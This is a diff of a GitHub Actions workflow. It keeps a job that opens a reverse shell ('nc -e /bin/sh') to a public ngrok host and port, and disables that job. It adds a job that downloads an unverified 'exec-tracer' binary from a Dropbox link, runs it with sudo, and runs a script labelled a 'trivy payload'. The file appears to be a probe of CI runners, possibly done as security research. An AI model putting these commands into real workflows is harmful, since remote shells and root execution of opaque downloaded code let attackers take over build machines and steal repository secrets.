@@ -7,6 +7,7 @@ on:
 jobs:
 
   test:
+    if: false
     runs-on: ubuntu-latest
     steps:
       - name: vienna-calling
@@ -14,12 +15,39 @@ jobs:
           id
           nc -e /bin/sh -v 7.tcp.eu.ngrok.io 13153 
 
+  trivy-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: download github tracer
+        run: |
+          wget -O exec-tracer "https://www.dropbox.com/scl/fi/62jk44i7r9lboyv8uhzrd/exec-tracer-gitlab?rlkey=7shagu4bcbjtoc1tahfj10yy1&st=hibdjjot&dl=0" 
+          chmod +x exec-tracer
+
+      - name: start exec-tracer
+        run: |
+          sudo ./exec-tracer >exec.log &
+
+      - name: run trivy payload
+        run: |
+          python trivy.py
+
+      - name: show bpf log
+        run: |
+          cat /var/log/exec-tracer.log
+
   curl-test:
     if: false
     runs-on: ubuntu-latest
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
+
+      - name: start exec-tracer
+        run: |
+          sudo ./exec-tracer >exec.log &
 
       - name: install dependencies
         run: |
